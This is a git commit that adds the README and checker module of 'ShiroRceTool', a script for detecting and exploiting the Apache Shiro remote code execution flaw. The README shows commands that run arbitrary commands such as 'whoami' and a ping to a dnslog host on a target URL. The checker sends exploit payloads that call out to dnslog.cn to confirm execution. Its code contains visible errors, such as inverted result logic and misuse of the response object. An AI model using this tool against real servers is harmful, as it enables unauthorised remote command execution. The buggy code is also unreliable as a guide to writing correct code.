d8a475001384e71b731b4d7768db7cb618a05372
Sergey M <12753171+s3rgeym@users.noreply.github.com>
2021-09-16 11:53:49 +0800

    Init

--- README.md
+++ README.md
@@ -1,2 +1,43 @@
 # ShiroRceTool
 Simple checker and exploit for Shiro RCE. (一个简单的Shiro RCE检测和利用脚本。)
+
+## 声明 WARNING
+* 仅供安全人员验证,测试是否存在此漏洞。  
+* It is only for security researcher to verify and test whether this vulnerability exists.  
+* **使用此工具检测必须遵守请使用者遵守[《中华人民共和国网络安全法》](http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm) 以及当地的法律，勿用于非授权的测试，本人不负任何连带法律责任。**  
+* Users must obey [the Cybersecurity Law of the People's Republic of China](http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm)  and local laws.
+
+## 使用方法 Usage
+
+```bash
+# USE PYTHON3
+$python ShiroRceTool.py -h
+ ____  _     _           ____         _____           _     
+/ ___|| |__ (_)_ __ ___ |  _ \ ___ __|_   _|__   ___ | |
+\___ \| '_ \| | '__/ _ \| |_) / __/ _ \| |/ _ \ / _ \| |
+ ___) | | | | | | | (_) |  _ < (_|  __/| | (_) | (_) | |
+|____/|_| |_|_|_|  \___/|_| \_\___\___||_|\___/ \___/|_|
+                        
+                        By: Hack3rHan
+
+usage: ShiroRceTool.py [-h] [-m MODE] [-u URL] [-c CMD] [-e]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -m MODE, --mode MODE  exploit or check
+  -u URL, --url URL     URL of the target.
+  -c CMD, --cmd CMD     Command to execute.
+  -e, --echo            Echo Command.
+```
+
+## 示例 Example
+
+```
+# Check
+python ShiroRceTool.py -m check -u "http://example.com"
+# Exec cmd with echo
+python ShiroRceTool.py -m exploit -u "http://example.com" -c "whoami" -e
+# Exec cmd with no echo
+python ShiroRceTool.py -m exploit -u "http://example.com" -c "ping dnslog.example.com"
+```
+
---
+++ core/Checker.py
@@ -0,0 +1,61 @@
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+"""
+File:   :   ShiroRceChecker.py
+Time    :   2021/09/15 17:18:27
+Author  :   Hack3rHan
+Contact :   Hack3rHan@protonmail.com
+"""
+import random
+import re
+import requests
+import string
+
+from core.Exploit import Exploit
+
+
+class Checker(object):
+
+    def __init__(self, url: str, is_tomcat: bool = False):
+        self.url = url
+        self.is_tomcat = is_tomcat
+
+    def run(self) -> bool:
+        self._send_check_request()
+
+    def _send_check_request(self):
+        dnslog_session = requests.session()
+
+        try:
+            dnslog_domain = dnslog_session.get('http://dnslog.cn/getdomain.php', timeout=10)
+        except Exception:
+            print('[!] ERROR: Can not get a domain from dnslog.cn')
+            return
+
+        cmd = 'ping {}'.format(dnslog_domain)
+
+        if self.is_tomcat:
+            exp = Exploit(url=self.url, cmd='id', echo=True)
+            for resp_content in exp.send_echo_exp():
+                if re.search(b'uid=.*?gid=.*?groups=.*?', resp_content):
+                    print('[*] INFO: Target is Vulnerable. (ECHO)')
+                    return
+            exp = Exploit(url=self.url, cmd='whoami /user', echo=True)
+            for resp_content in exp.send_echo_exp():
+                if re.search(b'S-\d-\d{1,3}-\d+-\d+-\d+', resp_content):
+                    print('[*] INFO: Target is Vulnerable. (ECHO)')
+                    return
+
+        exp = Exploit(url=self.url, cmd=cmd, echo=False)
+        exp.send_noecho_exp()
+        try:
+            resp = dnslog_session.get('http://dnslog.cn/getrecords.php', timeout=10)
+            res = dict(resp.text)
+        except Exception:
+            print("[!] ERROR: Can not get dnslog records from dnslog.cn")
+            return
+
+        if not res:
+            print('[*] INFO: Target is Vulnerable. (DNSLOG)')
+        else:
+            print('[*] INFO: Target may be not vulnerable. (DNSLOG)')
